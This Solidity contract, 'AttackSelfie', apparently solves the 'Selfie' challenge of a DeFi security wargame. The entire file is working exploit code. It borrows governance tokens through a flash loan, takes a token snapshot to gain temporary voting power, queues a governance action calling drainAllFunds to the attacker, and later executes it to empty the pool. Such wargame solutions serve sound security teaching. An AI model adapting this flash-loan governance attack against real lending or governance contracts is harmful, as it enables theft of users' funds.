// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IGov {
  function queueAction(address, bytes calldata, uint256) external returns (uint256);
  function executeAction(uint256) external;
}

interface IFlashLoan {
  function flashLoan(uint256) external;
}

interface ISnapshot {
  function snapshot() external;
}

contract AttackSelfie {
  address owner;
  IGov governance;
  address selfie;
  address token;

  uint256 actionId;

  constructor(address tokenAddress, address selfieAddress, address governanceAddress) {
    owner = msg.sender;
    token = tokenAddress;
    governance = IGov(governanceAddress);
    selfie = selfieAddress;
    actionId = 0;

  }

  function receiveTokens(address tokenAddress, uint256 amount) external{
    ISnapshot(token).snapshot();
    actionId = governance.queueAction(
      selfie,
      abi.encodeWithSignature("drainAllFunds(address)", owner),
      0);

     IERC20(tokenAddress).transfer(selfie, amount);

  }

  function attack() external {
    uint256 loanAmount = IERC20(token).balanceOf(address(selfie));
    IFlashLoan(selfie).flashLoan(loanAmount);

  }

  function drain() external {
    require(actionId  != 0);
    governance.executeAction(actionId);
  }

}
